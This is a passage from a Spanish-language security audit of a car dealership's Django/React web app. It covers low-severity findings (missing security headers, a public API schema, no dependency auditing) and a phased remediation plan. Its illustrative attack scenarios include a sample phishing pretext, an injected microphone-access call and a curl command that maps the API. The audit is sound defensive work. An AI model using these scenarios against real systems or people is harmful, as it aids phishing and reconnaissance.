> Un atacante visita la agencia Ford y le pide a un vendedor que le muestre el catálogo en la computadora de la sala de ventas. Mientras el vendedor busca un modelo, el atacante observa la pantalla y ve "Bienvenido, Juan Pérez" en la navbar. Con herramientas de desarrollador (F12), ve que `user.rol = 'vendedor'` y `user.email = 'jperez@ford-acapulco.com'`. Ahora tiene el email exacto para un ataque de phishing dirigido: "Hola Juan, soy de IT, tu cuenta será suspendida si no cambias tu contraseña aquí: [enlace malicioso]".

---

## 🔵 Hallazgos bajos (P3)

> Hardening final y buenas prácticas que completan la postura de seguridad.

---

### B1 — Sin header `Referrer-Policy`

**Archivo:** `backend/fordapp/settings.py`

**Explicación técnica:**  
Sin `Referrer-Policy`, el navegador envía la URL completa de la página actual como header `Referer` en cada petición a otro dominio. Si la URL contiene información sensible (tokens en query parameters, IDs de cita, etc.), esa información se filtra a servicios externos como CDNs, servicios de analytics o incluso las tiles de OpenStreetMap que usa el mapa interactivo.

**Ejemplo aplicado al sistema:**  
> Un cliente está en la página `https://ford-acapulco.com/cliente/citas?token=abc123`. El mapa interactivo de la página de contacto carga tiles de `tile.openstreetmap.org`. Sin `Referrer-Policy`, cada petición de tile incluye el header `Referer: https://ford-acapulco.com/cliente/citas?token=abc123`. Los servidores de OpenStreetMap (o cualquiera que los monitoree) pueden ver el token del cliente.

**✅ REMEDIADO** (2026-04-17)  
- El `ContentSecurityPolicyMiddleware` (`backend/apps/core/middleware.py`) inyecta `Referrer-Policy: strict-origin-when-cross-origin` en cada respuesta.  
- Solo se envía el origen (dominio) como referrer a destinos cross-origin, nunca la URL completa.

---

### B2 — Sin header `Permissions-Policy`

**Archivo:** `backend/fordapp/settings.py`

**Explicación técnica:**  
`Permissions-Policy` (antes `Feature-Policy`) permite deshabilitar APIs del navegador que la aplicación no usa: cámara, micrófono, geolocalización, USB, pagos, etc. Sin esta política, cualquier script que se ejecute en la página podría acceder a estas APIs con el permiso del usuario.

**Ejemplo aplicado al sistema:**  
> Si un atacante logra inyectar un script en la app Ford, podría solicitar acceso al micrófono del usuario con `navigator.mediaDevices.getUserMedia({audio: true})`. Si el usuario acepta (pensando que es una función legítima de la agencia), el atacante graba la conversación. Con `Permissions-Policy: microphone=()`, el navegador bloquea esta solicitud automáticamente antes de que el usuario la vea.

**✅ REMEDIADO** (2026-04-17)  
- El `ContentSecurityPolicyMiddleware` (`backend/apps/core/middleware.py`) inyecta `Permissions-Policy: camera=(), microphone=(), geolocation=(), usb=(), payment=()` en cada respuesta.  
- Todas las APIs de hardware están bloqueadas por defecto, incluso si un script malicioso intenta solicitarlas.

---

### B3 — Proxy de Vite con `changeOrigin: true`

**Archivo:** `frontend/vite.config.js`

**Explicación técnica:**  
La configuración `changeOrigin: true` en el proxy de desarrollo de Vite modifica el header `Host` de las peticiones proxied para que coincida con el servidor de destino en lugar del origen real. Esto solo afecta al entorno de desarrollo y no existe en producción. Sin embargo, puede enmascarar problemas de CORS durante el desarrollo que luego aparecen como bugs en producción.

**Ejemplo aplicado al sistema:**  
> El desarrollador configura una nueva política de CORS en el backend que solo acepta `https://ford-acapulco.com`. En desarrollo, todo funciona porque el proxy de Vite reescribe el `Host` header. Al desplegar en producción sin el proxy, la app deja de funcionar porque las peticiones vienen desde un dominio diferente al esperado. El equipo pierde horas depurando un problema que el proxy de desarrollo ocultó.

---

### B4 — Sin auditoría de dependencias en CI/CD

**Archivos:** Global (pipeline de CI/CD inexistente o sin checks de seguridad)

**Explicación técnica:**  
No hay un pipeline de integración continua que ejecute `npm audit` (frontend) o `pip-audit` (backend) automáticamente en cada commit o merge request. Esto significa que las vulnerabilidades conocidas en las dependencias solo se descubrirían si un desarrollador ejecuta estos comandos manualmente — lo cual rara vez ocurre.

**Ejemplo aplicado al sistema:**  
> Se descubre una vulnerabilidad crítica (CVE) en `djangorestframework` 3.14.0 que permite bypass de autenticación. La comunidad de seguridad la publica en la National Vulnerability Database. Sin `pip-audit` en CI/CD, el equipo de Ford Acapulco no se entera hasta que alguien lee la noticia semanas después — o peor, hasta que un atacante la explota.

---

### B5 — Schema API público pese a `SERVE_INCLUDE_SCHEMA: False`

**Archivos:** `backend/fordapp/settings.py`, `backend/fordapp/urls.py`

**Explicación técnica:**  
La configuración `SERVE_INCLUDE_SCHEMA: False` en DRF Spectacular previene que el schema se incluya inline en las respuestas de los endpoints. Sin embargo, el endpoint dedicado `/api/schema/` sigue sirviendo el schema OpenAPI completo sin autenticación. Son dos mecanismos independientes y uno no protege al otro.

**Ejemplo aplicado al sistema:**  
> Un atacante hace `curl https://ford-acapulco.com/api/schema/` y descarga un JSON con la estructura completa del API: todos los endpoints, modelos, campos, validaciones y relaciones. Con este mapa, puede escribir scripts automatizados que prueben cada endpoint sistemáticamente, sabiendo exactamente qué parámetros enviar y qué respuestas esperar.

---

## Plan de remediación por fases

### Fase 1 — Críticos (P0) ✅ COMPLETADA

1. ✅ Activar `ROTATE_REFRESH_TOKENS` y `BLACKLIST_AFTER_ROTATION` en `SIMPLE_JWT` → C3
2. ✅ Agregar `rest_framework_simplejwt.token_blacklist` a `INSTALLED_APPS` → C3/C4
3. ✅ Agregar todos los headers de seguridad HTTP a `settings.py` → C6
4. ✅ Implementar validación de archivos en serializers (extensión, tamaño, magic bytes) → C5
5. ✅ Eliminar `dangerouslySetInnerHTML` de `TestDrive.jsx` → C2
6. ✅ Reducir `ACCESS_TOKEN_LIFETIME` a 30 minutos → A6
7. ⬜ Migrar tokens JWT de `localStorage` a cookies `HttpOnly` → C1 *(pendiente — requiere cambio arquitectónico en frontend y backend)*

### Fase 2 — Altos (P1) ✅ COMPLETADA

8. ✅ Implementar throttling de DRF para login (`5/min`), registro (`3/min`) y citas (`10/hour`) → A1, A2, A3
9. ✅ Agregar límite de 5 citas activas por cliente → A3
10. ✅ Proteger `/api/docs/`, `/api/redoc/`, `/api/schema/` con `IsAdminUser` → A4
11. ✅ Ofuscar URL de Django Admin (`/gestion-ford-admin/`) → A5
12. ✅ Implementar CSP via middleware personalizado → A7
13. ✅ Agregar interceptor de refresh automático en `AuthContext.jsx` → M8 (bonus)
14. ✅ Crear wrapper `apiFetch()` con validación de `Content-Type` → A8
15. ⬜ Agregar logging de eventos de seguridad → M1 *(pendiente)*

### Fase 3 — Medios (P2) — parcial

16. ✅ Configurar límites explícitos de tamaño de upload (`DATA_UPLOAD` / `FILE_UPLOAD`) → M5
17. ✅ Declarar `SECURE_CONTENT_TYPE_NOSNIFF` explícitamente → M3
18. ⬜ Fijar versiones exactas en `requirements.txt` y `package.json` → M2
19. ⬜ Remover `db.sqlite3` del repositorio y agregar a `.gitignore` → M4
20. ⬜ Agregar validador de complejidad de contraseñas → M6
21. ⬜ Preparar formulario de contacto con sanitización → M7
22. ⬜ Ocultar info de usuario/rol en el DOM → M9

### Fase 4 — Bajos (P3) — parcial

23. ✅ Agregar header `Referrer-Policy` → B1
24. ✅ Agregar header `Permissions-Policy` → B2
25. ⬜ Documentar comportamiento de `changeOrigin` en Vite → B3
26. ⬜ Configurar `pip-audit` y `npm audit` en CI/CD → B4
27. ⬜ Restringir schema público → B5

---

## Resumen de archivos modificados/creados

| Archivo | Tipo | Hallazgos resueltos |
|---------|------|---------------------|
| `backend/fordapp/settings.py` | Modificado | C3, C6, A6, M3, M5 |
| `backend/apps/accounts/views.py` | Modificado | C4, A1, A2 |
| `backend/apps/accounts/urls.py` | Modificado | C4, A1 |
| `backend/fordapp/urls.py` | Modificado | A4, A5 |
| `backend/apps/citas/views.py` | Modificado | A3 |
| `backend/apps/autos/serializers.py` | Modificado | C5 |
| `backend/apps/vendedores/serializers.py` | Modificado | C5 |
| `backend/apps/core/validators.py` | **Creado** | C5, M5 |
| `backend/apps/core/middleware.py` | **Creado** | A7, B1, B2, M3 |
| `frontend/src/context/AuthContext.jsx` | Modificado | C3, C4, M8 |
| `frontend/src/pages/public/TestDrive.jsx` | Modificado | C2 |
| `frontend/src/index.css` | Modificado | C2 |
| `frontend/src/utils/apiFetch.js` | **Creado** | A8 |
